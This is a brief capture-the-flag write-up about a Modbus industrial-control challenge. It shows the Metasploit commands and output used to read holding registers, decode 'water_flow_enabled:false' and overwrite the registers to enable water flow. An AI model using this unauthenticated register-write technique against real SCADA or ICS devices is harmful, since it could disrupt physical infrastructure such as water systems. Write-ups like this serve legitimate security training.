# Short Writeup
we're given two links, one for getting the flag, the other just doesn't work. The description gives us the hint "busmod", which is just them messing with us to say the other link is actually the ip and port for modbus, a protocol used in SCADA/ICS systems.

You can do this with pymodbus, but doing it with Metasploit wasn't that bad. In Metasploit
```shell
msf6 auxiliary(scanner/scada/modbusdetect) > use auxiliary/scanner/scada/modbusclient
msf6 auxiliary(scanner/scada/modbusclient) > set RHOSTS challenge.nahamcon.com
RHOSTS => challenge.nahamcon.com
msf6 auxiliary(scanner/scada/modbusclient) > set RPORT 31981
RPORT => 31981
msf6 auxiliary(scanner/scada/modbusclient) > set NUMBER 40
NUMBER => 40
msf6 auxiliary(scanner/scada/modbusclient) > set DATA_ADDRESS 0
DATA_ADDRESS => 0
msf6 auxiliary(scanner/scada/modbusclient) > run
[*] Running module against 34.29.202.81

[*] 34.29.202.81:31981 - Sending READ HOLDING REGISTERS...
[+] 34.29.202.81:31981 - 40 register values from address 0 :
[+] 34.29.202.81:31981 - [119, 97, 116, 101, 114, 95, 102, 108, 111, 119, 95, 101, 110, 97, 98, 108, 101, 100, 58, 102, 97, 108, 115, 101, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17]
```

The data that comes out is just ASCII encoded `water_flow_enabled:false`, so we can try and write to those registers and change false to true..

```shell
msf6 auxiliary(scanner/scada/modbusclient) > set action WRITE_REGISTERS
action => WRITE_REGISTERS
msf6 auxiliary(scanner/scada/modbusclient) > set DATA_REGISTERS 119,97,116,101,114,95,102,108,111,119,95,101,110,97,98,108,101,100,58,116,114,117,101,17
msf6 auxiliary(scanner/scada/modbusclient) > run
[*] Running module against 34.29.202.81

[*] 34.29.202.81:31981 - Sending WRITE REGISTERS...
[+] 34.29.202.81:31981 - Values 119,97,116,101,114,95,102,108,111,119,95,101,110,97,98,108,101,100,58,116,114,117,101,17 successfully written from registry address 0
```
check website, get flag :)